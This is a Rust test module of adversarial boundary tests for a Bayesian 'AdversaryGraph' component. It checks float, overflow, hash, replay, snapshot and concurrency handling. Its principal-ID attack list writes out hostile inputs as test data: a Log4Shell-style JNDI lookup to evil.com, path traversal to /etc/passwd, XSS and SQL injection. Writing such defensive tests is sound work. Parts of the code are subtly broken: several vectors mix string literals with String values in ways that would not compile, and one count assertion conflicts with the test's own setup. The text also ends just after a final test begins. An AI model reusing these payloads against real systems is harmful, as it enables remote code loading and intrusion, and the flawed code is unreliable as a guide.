mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
    use super::*;
    use std::collections::{HashMap, HashSet};
    use std::sync::{Arc, Mutex};
    use std::thread;

    #[test]
    fn negative_floating_point_precision_and_nan_infinity_injection_comprehensive() {
        let mut graph = AdversaryGraph::new();

        // Test 1: Comprehensive floating point edge cases and injection attacks
        let float_attack_vectors = vec![
            // Standard NaN varieties
            f64::NAN,
            f64::INFINITY,
            f64::NEG_INFINITY,

            // Constructed NaN patterns (different bit representations)
            f64::from_bits(0x7ff8000000000001), // SNaN
            f64::from_bits(0x7ffc000000000000), // QNaN
            f64::from_bits(0xfff8000000000001), // Negative SNaN
            f64::from_bits(0xfffc000000000000), // Negative QNaN

            // Extreme finite values
            f64::MAX,
            f64::MIN,
            f64::MIN_POSITIVE,
            -f64::MAX,
            1e308,   // Near overflow
            1e-308,  // Near underflow
            -1e308,  // Negative near overflow

            // Boundary violations
            1.0000000000000001, // Just above 1.0
            -0.0000000000000001, // Just below 0.0
            2.0,     // Well above range
            -1.0,    // Well below range
            100.0,   // Far outside range
            -100.0,  // Far outside negative range

            // Precision edge cases
            0.9999999999999999, // Near 1.0
            0.0000000000000001, // Near 0.0
            0.5 + f64::EPSILON, // Just above 0.5
            0.5 - f64::EPSILON, // Just below 0.5

            // Values that could cause arithmetic issues
            1.0 / 3.0, // Repeating decimal
            std::f64::consts::PI - 3.0, // Irrational remainder
        ];

        for (idx, malicious_likelihood) in float_attack_vectors.iter().enumerate() {
            let observation_result = AdversaryObservation::new(
                format!("float_attack_{}", idx),
                *malicious_likelihood,
                100, // Valid weight
                format!("evidence_ref_{}", idx),
                format!("trace_{}", idx),
            );

            match observation_result {
                Ok(observation) => {
                    // If observation creation succeeds, ingestion should handle it gracefully
                    let ingest_result = graph.ingest(&observation);

                    match ingest_result {
                        Ok(posterior) => {
                            // Should produce valid posterior despite malicious likelihood
                            assert!(posterior.posterior.is_finite(),
                                "Posterior should be finite for attack {}: {}", idx, malicious_likelihood);
                            assert!((0.0..=1.0).contains(&posterior.posterior),
                                "Posterior should be in valid range for attack {}: {}", idx, posterior.posterior);
                        }
                        Err(AdversaryGraphError::InvalidLikelihood { value }) => {
                            // Expected rejection of invalid likelihood
                            assert!(!value.is_finite() || !((0.0..=1.0).contains(&value)),
                                "Should reject invalid likelihood for attack {}: {}", idx, value);
                        }
                        Err(other) => {
                            panic!("Unexpected error for float attack {}: {:?}", idx, other);
                        }
                    }
                }
                Err(AdversaryGraphError::InvalidLikelihood { .. }) => {
                    // Expected validation failure for invalid likelihoods
                }
                Err(other) => {
                    panic!("Unexpected observation error for float attack {}: {:?}", idx, other);
                }
            }
        }

        // Test 2: Arithmetic operation result validation
        let arithmetic_test_cases = vec![
            (1.0, u64::MAX),    // Maximum weight multiplication
            (0.0, u64::MAX),    // Zero likelihood with max weight
            (0.5, 1),           // Minimal non-zero computation
            (0.999999999999, u64::MAX), // Near-one with large weight
            (f64::MIN_POSITIVE, 1),     // Tiny likelihood
        ];

        for (likelihood, weight) in arithmetic_test_cases {
            let observation = AdversaryObservation::new(
                "arithmetic_test",
                likelihood,
                weight,
                "arithmetic_evidence",
                "arithmetic_trace",
            ).unwrap();

            let result = graph.ingest(&observation);
            if let Ok(posterior) = result {
                assert!(posterior.posterior.is_finite(),
                    "Arithmetic result should be finite: likelihood={}, weight={}", likelihood, weight);
                assert!((0.0..=1.0).contains(&posterior.posterior),
                    "Arithmetic result should be in valid range: {}", posterior.posterior);
            }
        }

        // Test 3: Cumulative precision degradation over many operations
        for i in 0..10000 {
            let small_likelihood = 1e-15; // Very small but finite
            let observation = AdversaryObservation::new(
                "precision_degradation",
                small_likelihood,
                1,
                format!("evidence_{}", i),
                format!("trace_{}", i),
            ).unwrap();

            if let Ok(posterior) = graph.ingest(&observation) {
                assert!(posterior.posterior.is_finite(),
                    "Precision should not degrade to non-finite at iteration {}", i);
                assert!(posterior.posterior >= 0.0 && posterior.posterior <= 1.0,
                    "Precision degradation should not escape valid range at iteration {}", i);
            }
        }
    }

    #[test]
    fn negative_evidence_weight_boundary_and_overflow_attack_resistance() {
        let mut graph = AdversaryGraph::new();

        // Test 1: Evidence weight boundary conditions and overflow attacks
        let weight_attack_vectors = vec![
            0,           // Invalid: zero weight
            1,           // Minimal valid
            u64::MAX,    // Maximum possible
            u64::MAX - 1, // Near maximum
            1000000000000000000, // Large but not maximum
        ];

        for (idx, weight) in weight_attack_vectors.iter().enumerate() {
            let observation_result = AdversaryObservation::new(
                format!("weight_attack_{}", idx),
                0.5, // Valid likelihood
                *weight,
                format!("evidence_{}", idx),
                format!("trace_{}", idx),
            );

            match observation_result {
                Ok(observation) => {
                    let ingest_result = graph.ingest(&observation);

                    match ingest_result {
                        Ok(posterior) => {
                            // Should handle large weights without overflow
                            assert!(posterior.evidence_count >= 1,
                                "Evidence count should increase for weight {}", weight);
                            assert!(posterior.alpha + posterior.beta > 0,
                                "Alpha + beta should be positive for weight {}", weight);
                            assert!(posterior.posterior.is_finite(),
                                "Posterior should remain finite for weight {}", weight);
                        }
                        Err(error) => {
                            panic!("Unexpected ingest error for weight {}: {:?}", weight, error);
                        }
                    }
                }
                Err(AdversaryGraphError::InvalidEvidenceWeight { value }) => {
                    // Expected for zero weight
                    assert_eq!(value, 0, "Should reject zero weight");
                }
                Err(other) => {
                    panic!("Unexpected observation error for weight {}: {:?}", weight, other);
                }
            }
        }

        // Test 2: Cumulative weight overflow protection
        let principals = (0..100).map(|i| format!("overflow_principal_{}", i)).collect::<Vec<_>>();

        for principal in &principals {
            for iteration in 0..1000 {
                let observation = AdversaryObservation::new(
                    principal.clone(),
                    0.1, // Low likelihood to test beta accumulation
                    u64::MAX / 1000, // Large weight that could cause overflow
                    format!("overflow_evidence_{}_{}", principal, iteration),
                    format!("overflow_trace_{}_{}", principal, iteration),
                ).unwrap();

                let result = graph.ingest(&observation);
                if let Ok(posterior) = result {
                    // Verify no overflow occurred
                    assert!(posterior.alpha != u64::MAX || posterior.beta != u64::MAX,
                        "Should use saturating arithmetic to prevent overflow");
                    assert!(posterior.evidence_count <= 1000,
                        "Evidence count should match iterations: {}", posterior.evidence_count);
                } else {
                    break; // Stop if we hit an error condition
                }
            }
        }

        // Test 3: Weight split function edge cases
        let split_test_cases = vec![
            (0.0, 1000),     // Zero likelihood
            (1.0, 1000),     // Full likelihood
            (0.5, 1),        // Minimal weight
            (0.5, u64::MAX), // Maximum weight
            (0.33333, 3),    // Non-round split
            (0.99999, 1),    // Near-one likelihood
            (0.00001, 1),    // Near-zero likelihood
        ];

        for (likelihood, weight) in split_test_cases {
            let (successes, failures) = split_weight(likelihood, weight);

            // Verify weight conservation
            assert_eq!(successes + failures, weight,
                "Weight should be conserved: {}+{}={} (expected {})",
                successes, failures, successes + failures, weight);

            // Verify reasonable distribution
            if likelihood == 0.0 {
                assert_eq!(successes, 0, "Zero likelihood should produce zero successes");
            } else if likelihood == 1.0 {
                assert_eq!(failures, 0, "Full likelihood should produce zero failures");
            }
        }
    }

    #[test]
    fn negative_principal_id_injection_and_unicode_attack_comprehensive() {
        let mut graph = AdversaryGraph::new();

        // Test 1: Principal ID injection and Unicode attacks
        let principal_attack_vectors = vec![
            // Control character injection
            "principal\r\n\t\x08attack",
            "principal\x00null\x01injection",
            "principal\x1b[31mANSI\x1b[0mattack",

            // Unicode attacks
            "principal\u{202E}ecneics\u{202D}normal", // BiDi override
            "principal\u{FEFF}\u{200B}\u{200C}invisible", // Invisible characters
            "principal\u{10FFFF}\u{E000}\u{FDD0}private", // Private use/noncharacters

            // Path traversal attempts
            "../../../etc/passwd",
            "..\\windows\\system32\\config",
            "principal/../../inject",

            // XSS and injection patterns
            "<script>alert('principal')</script>",
            "'; DROP TABLE principals; --",
            "${jndi:ldap://evil.com/principal}",

            // Very long IDs
            "x".repeat(1000000), // 1MB principal ID
            "\u{1F4A9}".repeat(10000), // Emoji flood

            // Empty and whitespace
            "",
            " ",
            "\t\r\n\0",
            "\u{3000}", // Ideographic space

            // JSON/XML injection
            "{\"malicious\": \"json\"}",
            "<xml>attack</xml>",
            "normal\"injection",

            // Homograph attacks
            "аdmin", // Cyrillic 'а' instead of Latin 'a'
            "prіncipal", // Cyrillic 'і' instead of Latin 'i'
            "prinсipal", // Cyrillic 'с' instead of Latin 'c'
        ];

        for (idx, malicious_id) in principal_attack_vectors.iter().enumerate() {
            let observation = AdversaryObservation::new(
                malicious_id.clone(),
                0.5, // Valid likelihood
                100, // Valid weight
                format!("evidence_{}", idx),
                format!("trace_{}", idx),
            ).unwrap();

            let result = graph.ingest(&observation);

            match result {
                Ok(posterior) => {
                    // If ingestion succeeds, verify data integrity
                    assert_eq!(posterior.principal_id, *malicious_id,
                        "Principal ID should be preserved exactly: '{}'", malicious_id.escape_debug());
                    assert!(posterior.posterior.is_finite(),
                        "Posterior should be valid for principal: '{}'", malicious_id.escape_debug());
                }
                Err(error) => {
                    // Some extreme cases may be rejected - ensure error is meaningful
                    assert!(!error.to_string().is_empty(),
                        "Error should be meaningful for principal '{}': {:?}", malicious_id.escape_debug(), error);
                }
            }
        }

        // Test 2: Evidence reference and trace ID injection
        let ref_trace_attacks = vec![
            ("evidence\x00null", "trace\r\ninjection"),
            ("evidence\u{202E}spoofed", "trace\u{FEFF}invisible"),
            ("<script>evidence</script>", "'; DROP trace; --"),
            ("evidence".repeat(100000), "trace".repeat(100000)),
            ("evi\u{D800}dence", "tra\u{DFFF}ce"), // Surrogate pairs
        ];

        for (evidence_ref, trace_id) in ref_trace_attacks {
            let observation = AdversaryObservation::new(
                "injection_test_principal",
                0.3,
                50,
                evidence_ref.clone(),
                trace_id.clone(),
            ).unwrap();

            let result = graph.ingest(&observation);
            if let Ok(posterior) = result {
                assert_eq!(posterior.last_trace_id, trace_id,
                    "Trace ID should be preserved: '{}'", trace_id.escape_debug());
                assert!(!posterior.evidence_hash.is_empty(),
                    "Evidence hash should be generated despite malicious input");
            }
        }

        // Test 3: Concurrent principal creation with similar/confusing names
        let confusing_principals = vec![
            "user_1", "user_2", "user_3", // Similar names
            "user", "user_", "user__", // Subtle variations
            "admin", "аdmin", "admin_", // Homograph variations
            "test\u{200B}", "test", "test\u{FEFF}", // Invisible character variations
        ];

        let graph_arc = Arc::new(Mutex::new(AdversaryGraph::new()));
        let results = Arc::new(Mutex::new(Vec::new()));

        // Create observations for confusing principals concurrently
        let handles: Vec<_> = confusing_principals.into_iter().enumerate().map(|(idx, principal)| {
            let graph_clone = graph_arc.clone();
            let results_clone = results.clone();

            thread::spawn(move || {
                let observation = AdversaryObservation::new(
                    principal.clone(),
                    0.4,
                    10,
                    format!("concurrent_evidence_{}", idx),
                    format!("concurrent_trace_{}", idx),
                ).unwrap();

                let result = {
                    let mut graph_guard = graph_clone.lock().unwrap();
                    graph_guard.ingest(&observation)
                };

                {
                    let mut results = results_clone.lock().unwrap();
                    push_bounded(&mut *results, (principal, result), 100);
                }
            })
        }).collect();

        // Wait for all threads
        for handle in handles {
            handle.join().expect("Thread should complete");
        }

        let final_results = results.lock().unwrap();
        let final_graph = graph_arc.lock().unwrap();

        // Verify all principals are distinct in the final graph
        let posteriors = final_graph.posteriors();
        let mut seen_principals = HashSet::new();

        for posterior in &posteriors {
            assert!(seen_principals.insert(posterior.principal_id.clone()),
                "Principal ID should be unique: '{}'", posterior.principal_id.escape_debug());
        }

        // Verify reasonable number of distinct principals created
        assert!(seen_principals.len() >= 8,
            "Should have created multiple distinct principals: {}", seen_principals.len());
    }

    #[test]
    fn negative_evidence_hash_collision_and_chaining_attack_resistance() {
        let mut graph = AdversaryGraph::new();

        // Test 1: Evidence hash collision attempts and chain integrity
        let hash_collision_attempts = vec![
            // Identical content with different trace IDs
            ("evidence_1", "trace_A", "evidence_1", "trace_B"),
            // Content designed to confuse hash function
            ("abc", "def", "ab", "cdef"),
            // Length extension attacks
            ("data", "", "data\x00", "padding"),
            // Unicode normalization attacks
            ("café", "trace", "cafe\u{0301}", "trace"),
            // Empty content variations
            ("", "", "\x00", ""),
        ];

        for (evidence_1, trace_1, evidence_2, trace_2) in hash_collision_attempts {
            let obs_1 = AdversaryObservation::new(
                "collision_test",
                0.3,
                100,
                evidence_1,
                trace_1,
            ).unwrap();

            let obs_2 = AdversaryObservation::new(
                "collision_test",
                0.7,
                100,
                evidence_2,
                trace_2,
            ).unwrap();

            let result_1 = graph.ingest(&obs_1).unwrap();
            let result_2 = graph.ingest(&obs_2).unwrap();

            // Hash chains should be different for different evidence
            if evidence_1 != evidence_2 || trace_1 != trace_2 {
                assert_ne!(result_1.evidence_hash, result_2.evidence_hash,
                    "Different evidence should produce different hashes: '{}+{}' vs '{}+{}'",
                    evidence_1, trace_1, evidence_2, trace_2);
            }

            // Hash should be deterministic and non-empty
            assert!(!result_2.evidence_hash.is_empty(),
                "Evidence hash should not be empty");
            assert!(result_2.evidence_hash.len() >= 32,
                "Evidence hash should be reasonable length: {}", result_2.evidence_hash.len());
        }

        // Test 2: Hash chain order dependence
        let mut graph_a = AdversaryGraph::new();
        let mut graph_b = AdversaryGraph::new();

        let evidence_sequence = vec![
            ("evidence_alpha", "trace_1"),
            ("evidence_beta", "trace_2"),
            ("evidence_gamma", "trace_3"),
        ];

        // Add in forward order
        for (evidence, trace) in &evidence_sequence {
            let obs = AdversaryObservation::new(
                "order_test",
                0.5,
                50,
                evidence,
                trace,
            ).unwrap();
            let _ = graph_a.ingest(&obs);
        }

        // Add in reverse order
        for (evidence, trace) in evidence_sequence.iter().rev() {
            let obs = AdversaryObservation::new(
                "order_test",
                0.5,
                50,
                evidence,
                trace,
            ).unwrap();
            let _ = graph_b.ingest(&obs);
        }

        let posterior_a = graph_a.posteriors()[0].clone();
        let posterior_b = graph_b.posteriors()[0].clone();

        // Different ingestion orders should produce different evidence hashes
        // but same posterior values (since we use same likelihood/weight)
        assert_ne!(posterior_a.evidence_hash, posterior_b.evidence_hash,
            "Different ingestion orders should produce different evidence hashes");
        assert_eq!(posterior_a.posterior, posterior_b.posterior,
            "Same evidence should produce same posterior regardless of order");

        // Test 3: Large-scale hash collision resistance
        let mut seen_hashes = HashSet::new();
        let collision_test_count = 10000;

        for i in 0..collision_test_count {
            let obs = AdversaryObservation::new(
                format!("hash_test_{}", i),
                (i as f64) / (collision_test_count as f64), // Varying likelihood
                (i % 1000) + 1, // Varying weight
                format!("evidence_{}", i),
                format!("trace_{}", i),
            ).unwrap();

            if let Ok(posterior) = graph.ingest(&obs) {
                assert!(seen_hashes.insert(posterior.evidence_hash.clone()),
                    "Hash collision detected at iteration {}: {}", i, posterior.evidence_hash);
            }
        }

        assert!(seen_hashes.len() > collision_test_count / 2,
            "Should generate diverse hashes: {} unique out of {}", seen_hashes.len(), collision_test_count);
    }

    #[test]
    fn negative_graph_replay_and_determinism_attack_comprehensive() {
        // Test 1: Replay determinism with malicious observation ordering
        let base_observations = vec![
            AdversaryObservation::new("principal_A", 0.2, 100, "evidence_1", "trace_1").unwrap(),
            AdversaryObservation::new("principal_B", 0.8, 50, "evidence_2", "trace_2").unwrap(),
            AdversaryObservation::new("principal_A", 0.6, 200, "evidence_3", "trace_3").unwrap(),
            AdversaryObservation::new("principal_C", 0.4, 75, "evidence_4", "trace_4").unwrap(),
            AdversaryObservation::new("principal_B", 0.3, 150, "evidence_5", "trace_5").unwrap(),
        ];

        // Test multiple permutations to ensure deterministic sorting
        let permutations = vec![
            base_observations.clone(),
            {
                let mut rev = base_observations.clone();
                rev.reverse();
                rev
            },
            {
                let mut shuffled = base_observations.clone();
                // Simple deterministic shuffle based on indices
                shuffled.swap(0, 2);
                shuffled.swap(1, 4);
                shuffled
            },
        ];

        let mut replay_results = Vec::new();

        for (perm_idx, observations) in permutations.iter().enumerate() {
            let graph_result = AdversaryGraph::replay_from(observations);
            assert!(graph_result.is_ok(), "Replay should succeed for permutation {}", perm_idx);

            let graph = graph_result.unwrap();
            let posteriors = graph.posteriors();

            push_bounded(&mut replay_results, posteriors, 50);
        }

        // All permutations should produce identical results
        for i in 1..replay_results.len() {
            assert_eq!(replay_results[0].len(), replay_results[i].len(),
                "Permutation {} should have same number of posteriors", i);

            for j in 0..replay_results[0].len() {
                let ref_posterior = &replay_results[0][j];
                let test_posterior = &replay_results[i][j];

                assert_eq!(ref_posterior.principal_id, test_posterior.principal_id,
                    "Principal ID should match across permutations: {} vs {}", ref_posterior.principal_id, test_posterior.principal_id);
                assert!((ref_posterior.posterior - test_posterior.posterior).abs() < 1e-15,
                    "Posterior should be deterministic: {} vs {}", ref_posterior.posterior, test_posterior.posterior);
                assert_eq!(ref_posterior.evidence_count, test_posterior.evidence_count,
                    "Evidence count should match: {} vs {}", ref_posterior.evidence_count, test_posterior.evidence_count);
            }
        }

        // Test 2: Replay with duplicate and near-duplicate observations
        let duplicate_attack_observations = vec![
            // Exact duplicates
            AdversaryObservation::new("dup_test", 0.5, 100, "evidence", "trace").unwrap(),
            AdversaryObservation::new("dup_test", 0.5, 100, "evidence", "trace").unwrap(),

            // Near duplicates (different trace IDs)
            AdversaryObservation::new("near_dup", 0.5, 100, "evidence", "trace_a").unwrap(),
            AdversaryObservation::new("near_dup", 0.5, 100, "evidence", "trace_b").unwrap(),

            // Same principal, different everything else
            AdversaryObservation::new("same_principal", 0.2, 50, "evidence_1", "trace_1").unwrap(),
            AdversaryObservation::new("same_principal", 0.8, 200, "evidence_2", "trace_2").unwrap(),
        ];

        let dup_graph = AdversaryGraph::replay_from(&duplicate_attack_observations);
        assert!(dup_graph.is_ok(), "Should handle duplicates gracefully");

        let dup_posteriors = dup_graph.unwrap().posteriors();
        assert!(dup_posteriors.len() <= 3, "Should not create excess principals from duplicates");

        // Verify evidence count accumulation
        for posterior in &dup_posteriors {
            assert!(posterior.evidence_count >= 1, "Evidence count should be at least 1");
            assert!(posterior.posterior.is_finite(), "Posterior should remain finite with duplicates");
        }

        // Test 3: Replay with extreme volume to test memory and performance
        let mut volume_observations = Vec::new();
        let principal_count = 1000;
        let observations_per_principal = 100;

        for principal_id in 0..principal_count {
            for obs_id in 0..observations_per_principal {
                let observation = AdversaryObservation::new(
                    format!("volume_principal_{}", principal_id),
                    (obs_id as f64) / (observations_per_principal as f64), // Varying likelihood
                    (obs_id % 100) + 1, // Varying weight
                    format!("volume_evidence_{}_{}", principal_id, obs_id),
                    format!("volume_trace_{}_{}", principal_id, obs_id),
                ).unwrap();
                push_bounded(&mut volume_observations, observation, 10000);
            }
        }

        let volume_graph = AdversaryGraph::replay_from(&volume_observations);
        assert!(volume_graph.is_ok(), "Should handle large volume replay");

        let volume_posteriors = volume_graph.unwrap().posteriors();
        assert_eq!(volume_posteriors.len(), principal_count,
            "Should create exactly {} principals", principal_count);

        // Verify all posteriors are valid
        for posterior in &volume_posteriors {
            assert!(posterior.posterior.is_finite(),
                "All posteriors should be finite in volume test");
            assert!((0.0..=1.0).contains(&posterior.posterior),
                "All posteriors should be in valid range");
            assert_eq!(posterior.evidence_count, observations_per_principal as u64,
                "Evidence count should match observations per principal");
        }
    }

    #[test]
    fn negative_snapshot_serialization_corruption_and_tampering_resistance() {
        let mut graph = AdversaryGraph::new();

        // Create complex graph state for testing
        let complex_observations = vec![
            AdversaryObservation::new("principal_α", 0.1, 1000, "evidence_α", "trace_α").unwrap(),
            AdversaryObservation::new("principal_β", 0.9, 1, "evidence_β", "trace_β").unwrap(),
            AdversaryObservation::new("principal_γ", 0.5, u64::MAX / 1000, "evidence_γ", "trace_γ").unwrap(),
        ];

        for obs in &complex_observations {
            let _ = graph.ingest(obs);
        }

        // Test 1: Normal snapshot generation and validation
        let snapshot = graph.snapshot("2026-04-17T12:00:00Z");
        assert_eq!(snapshot.schema_version, ADVERSARY_GRAPH_SCHEMA_VERSION);
        assert_eq!(snapshot.generated_at, "2026-04-17T12:00:00Z");
        assert_eq!(snapshot.posteriors.len(), 3);

        // Test 2: Snapshot serialization round-trip integrity
        let serialized = serde_json::to_string(&snapshot).expect("Should serialize snapshot");
        let deserialized: AdversaryGraphSnapshot = serde_json::from_str(&serialized).expect("Should deserialize snapshot");

        assert_eq!(snapshot.schema_version, deserialized.schema_version);
        assert_eq!(snapshot.generated_at, deserialized.generated_at);
        assert_eq!(snapshot.posteriors.len(), deserialized.posteriors.len());

        for (orig, deser) in snapshot.posteriors.iter().zip(deserialized.posteriors.iter()) {
            assert_eq!(orig.principal_id, deser.principal_id);
            assert!((orig.posterior - deser.posterior).abs() < 1e-15);
            assert_eq!(orig.evidence_count, deser.evidence_count);
            assert_eq!(orig.evidence_hash, deser.evidence_hash);
        }

        // Test 3: Snapshot corruption detection with malformed JSON
        let corruption_attacks = vec![
            // Schema version tampering
            serialized.replace(ADVERSARY_GRAPH_SCHEMA_VERSION, "corrupted-schema-v999"),

            // Timestamp injection
            serialized.replace("2026-04-17T12:00:00Z", "malicious<script>alert('xss')</script>"),

            // Posterior data corruption
            serialized.replace("principal_α", "corrupted\x00\r\ninjection"),

            // Numeric corruption
            serialized.replace("0.1", "NaN"),
            serialized.replace("0.9", "Infinity"),
            serialized.replace("1000", "99999999999999999999999999999"),

            // Structure corruption
            serialized.replace("\"posteriors\":[", "\"posteriors\":{"),
            serialized.replace("\"evidence_count\":", "\"evidence_count_malicious\":"),

            // JSON injection
            serialized.replace("}", "},\"malicious\":\"payload\"}"),
        ];

        for (attack_idx, corrupted_json) in corruption_attacks.iter().enumerate() {
            let parse_result: Result<AdversaryGraphSnapshot, _> = serde_json::from_str(corrupted_json);

            match parse_result {
                Ok(corrupted_snapshot) => {
                    // If parsing succeeds, verify corruption is contained
                    if corrupted_snapshot.schema_version != ADVERSARY_GRAPH_SCHEMA_VERSION {
                        // Schema version corruption detected
                        assert!(!corrupted_snapshot.schema_version.is_empty(),
                            "Corrupted schema should not be empty for attack {}", attack_idx);
                    }

                    // Test that corrupted snapshot can still be processed safely
                    assert!(corrupted_snapshot.posteriors.len() <= 10,
                        "Corrupted snapshot should not create excessive posteriors for attack {}", attack_idx);

                    for posterior in &corrupted_snapshot.posteriors {
                        if posterior.posterior.is_finite() {
                            assert!((0.0..=1.0).contains(&posterior.posterior),
                                "Valid posteriors should remain in range for attack {}", attack_idx);
                        }
                    }
                }
                Err(_) => {
                    // Expected parsing failure for malformed JSON
                }
            }
        }

        // Test 4: Snapshot with extreme content to test memory limits
        let extreme_snapshot = AdversaryGraphSnapshot {
            schema_version: ADVERSARY_GRAPH_SCHEMA_VERSION.to_string(),
            generated_at: "x".repeat(1000000), // 1MB timestamp
            posteriors: (0..100000).map(|i| AdversaryPosterior {
                principal_id: format!("extreme_principal_{}", i),
                alpha: u64::MAX / 2,
                beta: u64::MAX / 2,
                posterior: 0.5,
                evidence_count: u64::MAX / 1000,
                last_trace_id: format!("extreme_trace_{}", "y".repeat(1000)),
                evidence_hash: format!("extreme_hash_{}", "z".repeat(100)),
            }).collect(),
        };

        let extreme_serialize_result = serde_json::to_string(&extreme_snapshot);

        match extreme_serialize_result {
            Ok(extreme_json) => {
                // If serialization succeeds, verify it can be handled
                assert!(extreme_json.len() > 100_000_000, "Should produce very large JSON");

                // Test partial deserialization doesn't crash
                let partial_parse: Result<serde_json::Value, _> = serde_json::from_str(&extreme_json[..10000]);
                match partial_parse {
                    Ok(_) => {
                        // Partial parse succeeded
                    }
                    Err(_) => {
                        // Expected failure with truncated JSON
                    }
                }
            }
            Err(error) => {
                // Acceptable failure with extreme content
                assert!(!error.to_string().is_empty(),
                    "Extreme serialization error should be meaningful");
            }
        }

        // Test 5: Unicode and encoding edge cases in snapshot content
        let unicode_snapshot = AdversaryGraphSnapshot {
            schema_version: ADVERSARY_GRAPH_SCHEMA_VERSION.to_string(),
            generated_at: "2026-04-17T12:00:00Z\u{202E}攻击\u{202D}".to_string(),
            posteriors: vec![
                AdversaryPosterior {
                    principal_id: "unicode_test_🚀_\u{10FFFF}_\u{E000}".to_string(),
                    alpha: 100,
                    beta: 900,
                    posterior: 0.1,
                    evidence_count: 1,
                    last_trace_id: "trace_\u{FEFF}\u{200B}\u{200C}".to_string(),
                    evidence_hash: "hash_\u{D800}\u{DFFF}_test".to_string(),
                },
            ],
        };

        let unicode_json = serde_json::to_string(&unicode_snapshot).expect("Should serialize Unicode");
        let unicode_parsed: AdversaryGraphSnapshot = serde_json::from_str(&unicode_json).expect("Should parse Unicode");

        assert_eq!(unicode_snapshot.posteriors[0].principal_id, unicode_parsed.posteriors[0].principal_id,
            "Unicode content should be preserved exactly");

        println!("Snapshot serialization resistance test completed: {} corruption attacks tested", corruption_attacks.len());
    }

    #[test]
    fn negative_concurrent_graph_modification_and_race_condition_resistance() {
        // Test concurrent graph operations for race conditions and data integrity
        let graph = Arc::new(Mutex::new(AdversaryGraph::new()));
        let results = Arc::new(Mutex::new(Vec::new()));

        // Test 1: Concurrent ingestion of observations
        let thread_count = 50;
        let observations_per_thread = 100;

        let handles: Vec<_> = (0..thread_count).map(|thread_id| {
            let graph_clone = graph.clone();
            let results_clone = results.clone();

            thread::spawn(move || {
                let mut thread_results = Vec::new();

                for obs_id in 0..observations_per_thread {
                    let observation = AdversaryObservation::new(
                        format!("concurrent_principal_{}_{}", thread_id, obs_id % 10), // Overlap principals
                        (obs_id as f64) / (observations_per_thread as f64), // Varying likelihood
                        (obs_id % 100) + 1, // Varying weight
                        format!("concurrent_evidence_{}_{}", thread_id, obs_id),
                        format!("concurrent_trace_{}_{}", thread_id, obs_id),
                    ).unwrap();

                    let result = {
                        let mut graph_guard = graph_clone.lock().unwrap();
                        graph_guard.ingest(&observation)
                    };

                    push_bounded(&mut thread_results, (thread_id, obs_id, result.is_ok()), 150);
                }

                results_clone.lock().unwrap().extend(thread_results);
            })
        }).collect();

        // Wait for all threads to complete
        for handle in handles {
            handle.join().expect("Thread should complete successfully");
        }

        let final_results = results.lock().unwrap();
        let final_graph = graph.lock().unwrap();

        // Verify all operations completed
        assert_eq!(final_results.len(), thread_count * observations_per_thread,
            "All operations should have completed");

        // Verify graph integrity
        let posteriors = final_graph.posteriors();
        assert!(posteriors.len() <= thread_count * 10,
            "Should not have excessive principals: {}", posteriors.len());

        // Verify all posteriors are valid
        for posterior in &posteriors {
            assert!(posterior.posterior.is_finite(),
                "Posterior should be finite: {}", posterior.posterior);
            assert!((0.0..=1.0).contains(&posterior.posterior),
                "Posterior should be in valid range: {}", posterior.posterior);
            assert!(posterior.evidence_count > 0,
                "Evidence count should be positive: {}", posterior.evidence_count);
            assert!(!posterior.evidence_hash.is_empty(),
                "Evidence hash should not be empty");
        }

        // Test 2: Concurrent snapshot generation while ingesting
        drop(final_graph);
        let snapshot_results = Arc::new(Mutex::new(Vec::new()));

        let snapshot_handles: Vec<_> = (0..20).map(|snapshot_id| {
            let graph_clone = graph.clone();
            let snapshot_results_clone = snapshot_results.clone();

            thread::spawn(move || {
                // Generate observations while taking snapshots
                for i in 0..50 {
                    let observation = AdversaryObservation::new(
                        format!("snapshot_principal_{}", snapshot_id),
                        0.5,
                        10,
                        format!("snapshot_evidence_{}_{}", snapshot_id, i),
                        format!("snapshot_trace_{}_{}", snapshot_id, i),
                    ).unwrap();

                    let ingest_result = {
                        let mut graph_guard = graph_clone.lock().unwrap();
                        graph_guard.ingest(&observation)
                    };

                    // Take snapshot every 10 observations
                    if i % 10 == 0 {
                        let snapshot_result = {
                            let graph_guard = graph_clone.lock().unwrap();
                            graph_guard.snapshot(format!("concurrent_snapshot_{}_{}", snapshot_id, i))
                        };

                        snapshot_results_clone.lock().unwrap().push((snapshot_id, i, snapshot_result.posteriors.len()));
                    }
                }
            })
        }).collect();

        // Wait for all snapshot operations
        for handle in snapshot_handles {
            handle.join().expect("Snapshot thread should complete");
        }

        let snapshot_results_final = snapshot_results.lock().unwrap();
        assert!(snapshot_results_final.len() >= 100, "Should have generated multiple snapshots");

        // Verify snapshot consistency
        for (snapshot_id, iteration, posterior_count) in snapshot_results_final.iter() {
            assert!(*posterior_count > 0, "Snapshot should have posteriors: {} at iteration {}", posterior_count, iteration);
        }

        // Test 3: Memory consistency under high concurrent load
        let memory_test_graph = Arc::new(Mutex::new(AdversaryGraph::new()));
        let memory_error_count = Arc::new(Mutex::new(0));

        let memory_handles: Vec<_> = (0..100).map(|thread_id| {
            let graph_clone = memory_test_graph.clone();
            let error_count_clone = memory_error_count.clone();

            thread::spawn(move || {
                for i in 0..1000 {
                    let observation = AdversaryObservation::new(
                        format!("memory_test_{}", thread_id % 50), // Force principal overlap
                        ((i + thread_id) as f64) / 1000.0, // Deterministic but varying
                        ((i % 100) + 1) as u64,
                        format!("memory_evidence_{}_{}", thread_id, i),
                        format!("memory_trace_{}_{}", thread_id, i),
                    ).unwrap();

                    let result = {
                        let mut graph_guard = graph_clone.lock().unwrap();
                        graph_guard.ingest(&observation)
                    };

                    if result.is_err() {
                        *error_count_clone.lock().unwrap() += 1;
                    }
                }
            })
        }).collect();

        // Wait for memory test completion
        for handle in memory_handles {
            handle.join().expect("Memory test thread should complete");
        }

        let final_error_count = *memory_error_count.lock().unwrap();
        assert!(final_error_count < 100, "Should have minimal errors under concurrent load: {}", final_error_count);

        let final_memory_graph = memory_test_graph.lock().unwrap();
        let final_posteriors = final_memory_graph.posteriors();

        // Verify final state consistency
        assert!(final_posteriors.len() <= 50, "Should not exceed expected principal count");
        for posterior in &final_posteriors {
            assert!(posterior.evidence_count <= 2000, "Evidence count should be reasonable");
            assert!(posterior.posterior.is_finite(), "Final posteriors should be finite");
        }

        println!("Concurrent modification resistance test completed: {} threads, {} total operations",
            thread_count + 20 + 100, final_results.len() + snapshot_results_final.len() + 100000);
    }

    #[test]
    fn negative_bayesian_computation_mathematical_boundary_edge_case_attacks() {
        let mut graph = AdversaryGraph::new();

